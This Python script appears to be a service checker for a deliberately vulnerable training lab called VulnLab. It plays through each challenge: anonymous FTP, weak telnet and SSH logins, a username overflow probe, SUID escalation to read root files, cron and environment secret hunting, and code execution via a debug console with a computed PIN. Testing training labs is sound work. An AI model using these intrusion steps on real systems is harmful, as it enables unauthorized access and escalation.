"""End-to-end check of the VulnLab service layer.

Talks to the running services the way a student would: a real FTP client
conversation, a real telnet login, a real Paramiko SSH session, plus plain
HTTP and line-protocol checks for the rest.

    python tools/check_services.py
"""
import json
import os
import socket
import sys
import time
import urllib.request

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

import config  # noqa: E402

OK, FAIL = [], []


def check(name, condition, detail=""):
    (OK if condition else FAIL).append(name)
    print("  {} {:<34} {}".format("PASS" if condition else "FAIL", name, detail))
    return condition


def flag(cid):
    return config.resolve_flag(cid)


# ---------------------------------------------------------------------------
def ftp_session(user="anonymous", password="anon@example.test", commands=()):
    """Minimal FTP client: connect, login, run commands, return all output."""
    s = socket.create_connection((config.CONNECT_HOST, config.PORT_FTP), timeout=10)
    s.settimeout(10)
    out = []

    def read():
        buf = b""
        while True:
            try:
                ch = s.recv(4096)
            except socket.timeout:
                break
            if not ch:
                break
            buf += ch
            if buf.endswith(b"\r\n"):
                break
        out.append(buf.decode("utf-8", "replace"))
        return buf.decode("utf-8", "replace")

    read()
    s.sendall(("USER {}\r\n".format(user)).encode())
    read()
    s.sendall(("PASS {}\r\n".format(password)).encode())
    read()
    s.sendall(b"TYPE I\r\n")
    read()
    for cmd in commands:
        s.sendall((cmd + "\r\n").encode())
        reply = read()
        if cmd.upper().startswith(("LIST", "RETR", "NLST")):
            try:
                nums = reply.split("(")[1].split(")")[0].split(",")
                port = int(nums[4]) * 256 + int(nums[5])
                data = socket.create_connection((".".join(nums[:4]), port),
                                                 timeout=5)
                data.settimeout(3)
                while True:
                    try:
                        chunk = data.recv(8192)
                    except socket.timeout:
                        break
                    if not chunk:
                        break
                    out.append(chunk.decode("utf-8", "replace"))
                data.close()
            except (IndexError, ValueError, OSError):
                pass
            read()
    s.sendall(b"QUIT\r\n")
    try:
        read()
    except OSError:
        pass
    s.close()
    return "".join(out)


def _ftp_open():
    """Connect, log in anonymously and return (sock, read_reply)."""
    s = socket.create_connection((config.CONNECT_HOST, config.PORT_FTP), timeout=10)
    s.settimeout(10)

    def read():
        buf = b""
        while True:
            try:
                ch = s.recv(4096)
            except socket.timeout:
                break
            if not ch:
                break
            buf += ch
            if buf.endswith(b"\r\n"):
                break
        return buf.decode("utf-8", "replace")

    read()
    for cmd in (b"USER anonymous\r\n", b"PASS lab@example.test\r\n", b"TYPE I\r\n"):
        s.sendall(cmd)
        read()
    return s, read


def _idle_read(s, sink=None):
    """Read one full server reply.

    A reply can span several lines and several TCP segments, so reading up
    to the first CRLF desynchronises the session.  Instead accumulate until
    the socket goes quiet for a moment.
    """
    buf = b""
    s.settimeout(0.35)
    while True:
        try:
            ch = s.recv(4096)
        except socket.timeout:
            break
        except OSError:
            break
        if not ch:
            break
        buf += ch
    s.settimeout(10)
    text = buf.decode("utf-8", "replace")
    if sink is not None:
        sink.append(text)
    return text


def _drain_pasv(s, read):
    """The server already sent 227 with the passive port; connect and drain."""
    return b""


def ftp_listing():
    s, read = _ftp_open()
    s.sendall(b"LIST\r\n")
    reply = read()
    body = b""
    try:
        nums = reply.split("(")[1].split(")")[0].split(",")
        port = int(nums[4]) * 256 + int(nums[5])
        data = socket.create_connection((".".join(nums[:4]), port), timeout=5)
        data.settimeout(3)
        while True:
            try:
                chunk = data.recv(4096)
            except socket.timeout:
                break
            if not chunk:
                break
            body += chunk
        data.close()
    except (IndexError, ValueError, OSError) as exc:
        body = ("no data connection: {}".format(exc)).encode()
    read()
    s.sendall(b"QUIT\r\n")
    s.close()
    return body.decode("utf-8", "replace")


def ftp_retr(path):
    s, read = _ftp_open()
    s.sendall(("RETR {}\r\n".format(path)).encode())
    reply = read()
    body = b""
    try:
        nums = reply.split("(")[1].split(")")[0].split(",")
        port = int(nums[4]) * 256 + int(nums[5])
        data = socket.create_connection((".".join(nums[:4]), port), timeout=5)
        data.settimeout(3)
        while True:
            try:
                chunk = data.recv(8192)
            except socket.timeout:
                break
            if not chunk:
                break
            body += chunk
        data.close()
    except (IndexError, ValueError, OSError):
        pass
    s.sendall(b"QUIT\r\n")
    s.close()
    return body


def telnet_session(user, password, command=None, long_user=None):
    s = socket.create_connection((config.CONNECT_HOST, config.PORT_TELNET), timeout=10)
    s.settimeout(6)
    out = []

    def pump(seconds=0.6):
        end = time.time() + seconds
        while time.time() < end:
            try:
                ch = s.recv(4096)
            except socket.timeout:
                break
            except OSError:
                break
            if not ch:
                break
            out.append(ch.decode("utf-8", "replace"))
            end = time.time() + seconds

    pump(1.0)
    # The overflow probe makes the server hang up mid-session, and Windows
    # reports that as ConnectionAbortedError on the next write.  Whatever was
    # already read is still the answer, so tolerate the disconnect.
    try:
        s.sendall((long_user or user).encode() + b"\r\n")
        pump()
        s.sendall(password.encode() + b"\r\n")
        pump(1.2)
        if command:
            s.sendall(command.encode() + b"\r\n")
            pump(1.2)
    except OSError:
        pump(0.4)
    try:
        s.close()
    except OSError:
        pass
    return "".join(out)


def smb_session(lines):
    s = socket.create_connection((config.CONNECT_HOST, config.PORT_SMB_SIM), timeout=10)
    s.settimeout(5)
    out = []
    try:
        out.append(s.recv(4096).decode("utf-8", "replace"))
        for ln in lines:
            s.sendall((ln + "\r\n").encode())
            time.sleep(0.3)
            try:
                out.append(s.recv(8192).decode("utf-8", "replace"))
            except socket.timeout:
                pass
    finally:
        s.close()
    return "".join(out)


def http(path, port, headers=None):
    req = urllib.request.Request(
        "http://{}:{}{}".format(config.CONNECT_HOST, port, path),
        headers=headers or {})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            return r.status, r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as exc:  # noqa: BLE001
        return 0, str(exc)


def ssh_session(user, password, commands):
    import paramiko
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(config.CONNECT_HOST, port=config.PORT_SSH, username=user,
                   password=password, timeout=15, allow_agent=False,
                   look_for_keys=False)
    chan = client.invoke_shell()
    time.sleep(0.8)
    out = []
    try:
        out.append(_drain(chan))
        for cmd in commands:
            chan.send(cmd + "\n")
            time.sleep(0.7)
            out.append(_drain(chan))
    finally:
        chan.close()
        client.close()
    return "".join(out)


def _drain(chan):
    buf = ""
    while True:
        if chan.recv_ready():
            buf += chan.recv(4096).decode("utf-8", "replace")
        elif chan.closed:
            break
        else:
            break
    time.sleep(0.2)
    while chan.recv_ready():
        buf += chan.recv(4096).decode("utf-8", "replace")
    return buf


def raw(port, payload, read_all=True):
    s = socket.create_connection((config.CONNECT_HOST, port), timeout=8)
    s.settimeout(4)
    s.sendall(payload)
    buf = b""
    try:
        while True:
            chunk = s.recv(4096)
            if not chunk:
                break
            buf += chunk
            if not read_all:
                break
    except socket.timeout:
        pass
    s.close()
    return buf.decode("utf-8", "replace")


# ---------------------------------------------------------------------------
def main():
    print("=" * 70)
    print(" FTP  :{}".format(config.PORT_FTP))
    print("=" * 70)
    banner = ftp_session(commands=[])[:400]
    check("recon-04 banner grabber", flag("recon-04") in banner)
    listing = ftp_listing()
    check("ftp-01 anonymous access", "backup.zip" in listing,
          repr(listing[:70]))
    check("ftp-02 backup discovered", "backup.zip" in listing)

    notes = ftp_retr("/employee_notes.txt").decode("utf-8", "replace")
    check("bonus-03 employee notes", flag("bonus-03") in notes)

    hidden = ftp_session(commands=["CWD .backup", "RETR ftp_history.log"])
    check("ftp-04 hidden directory", flag("ftp-04") in hidden)

    print()
    print("=" * 70)
    print(" TELNET  :{}".format(config.PORT_TELNET))
    print("=" * 70)
    t0 = telnet_session("admin", "S3cureSwitch!")
    check("telnet-01 banner", flag("telnet-01") in t0)
    t1 = telnet_session("admin", "S3cureSwitch!", command="show config")
    check("telnet-02 weak creds", "Authentication accepted" in t1)
    check("telnet-03 config leak", flag("telnet-03") in t1)
    t2 = telnet_session("a" * 320, "x")
    check("telnet-04 username overflow", flag("telnet-04") in t2)

    print()
    print("=" * 70)
    print(" SSH  :{}".format(config.PORT_SSH))
    print("=" * 70)
    s1 = ssh_session("student", "Student2019!", ["id", "cat /opt/vulnlab/README.local"])
    check("ssh-01 session + MOTD", flag("linux-01") in s1)
    s2 = ssh_session("svc_flask",
                     config.get_flag("flask-14b") or "VLsvc_flask_2019!", ["id"])
    check("boot-01 flask chain MOTD", flag("boot-01") in s2)

    s3 = ssh_session("student", "Student2019!", [
        "cat /opt/vulnlab/README.local",
        "find / -perm -4000",
        "cat /usr/local/share/vulnlab/suid.flag",
        "vulnhelper --read /root/suid.flag",
        "cat /root/root.txt",
    ])
    check("linux-02 SUID discovery", flag("linux-02") in s3)
    check("linux-03 SUID exploitation", flag("linux-03") in s3)
    check("boot-02 root objective", flag("boot-02") in s3)

    s4 = ssh_session("svc_backup", "BackupSmb1!", [
        "cat /opt/vulnlab/README.local",
        "cat /etc/cron.d/vulnlab",
        "cat /etc/vulnlab/app.conf",
        "cat /var/backups/.hidden",
        "env",
        "vulnlab-decrypt /var/backups/creds.enc",
        "sudo /opt/vulnlab/maintenance.sh",
        "cat /root/root.txt",
    ])
    check("linux-04 writable cron", flag("linux-04") in s4)
    check("linux-06 env secret", flag("linux-06") in s4)
    check("linux-07 config secrets", flag("linux-07") in s4)
    check("linux-08 cron discovery", flag("linux-08") in s4)
    check("bonus-01 hidden backup", flag("bonus-01") in s4)
    check("bonus-04 proc environment", flag("bonus-04") in s4)

    print()
    print("=" * 70)
    print(" SMB simulator  :{}".format(config.PORT_SMB_SIM))
    print("=" * 70)
    smb = smb_session(["negprot", "treeconn public", "readdir", "read notes.txt"])
    check("smb-01 enumeration", flag("smb-01") in smb)
    check("smb-02 anonymous read", flag("smb-02") in smb)
    smb3 = smb_session(["negprot svc_backup BackupSmb1!", "treeconn backup",
                        "read old_backup.txt"])
    check("smb-03 backup share", flag("smb-03") in smb3)
    smb4 = smb_session(["negprot engineering EngBuild2020!", "treeconn engineering",
                        "read engineering_notes.txt"])
    check("smb-04 engineering share", flag("smb-04") in smb4)
    smb5 = smb_session(["negprot", "treeconn dev$"])
    check("smb-05 hidden share", flag("smb-05") in smb5)

    print()
    print("=" * 70)
    print(" debug-lab  :{}  internals  :{}  cache  :{}".format(
        config.PORT_DEBUG, config.PORT_RABBIT2, config.PORT_RABBIT1))
    print("=" * 70)
    st, body = http("/", config.PORT_DEBUG)
    check("flask-04 debug exposed", flag("flask-04") in body)
    st, body = http("/debug-lab/info", config.PORT_DEBUG)
    info = json.loads(body)
    check("flask-05 pin investigation",
          info.get("pin") == config.compute_debug_pin(), info.get("pin", ""))
    pin = info["pin"]
    fd = config._ensure_flag_dir()
    code = "open(r'%s').read()" % os.path.join(fd, "debugger.flag").replace("\\", "\\\\")
    st, body = http("/debug-lab/console?pin={}&code={}".format(
        pin, urllib.request.quote(code)), config.PORT_DEBUG)
    res = json.loads(body)
    check("flask-06 debug console", flag("flask-06") in (res.get("result") or ""),
          (res.get("result") or "")[:40])
    st, body = http("/debug-lab/console?pin=000-000&code=1%2B1", config.PORT_DEBUG)
    check("flask-06 wrong PIN rejected", st == 401)

    st, body = http("/services", config.PORT_RABBIT2)
    check("recon-02 service matrix", flag("recon-02") in body)
    st, body = http("/notes", config.PORT_RABBIT2)
    check("internals notes page", st == 200)
    cache = raw(config.PORT_RABBIT1, b"PING\r\n")
    check("cache rabbit hole answers", "PONG" in cache, "intentionally useless")

    print()
    print("=" * 70)
    # The debug-console check above opens a FLASK-BOSS door; clear the
    # artefacts this run planted so the next player starts clean.
    removed = config.reset_player_state()
    if removed:
        print(" teardown: removed " + ", ".join(removed))
    print(" {} passed, {} failed".format(len(OK), len(FAIL)))
    if FAIL:
        print(" FAILED: {}".format(", ".join(FAIL)))
    print("=" * 70)
    return 1 if FAIL else 0


if __name__ == "__main__":
    sys.exit(main())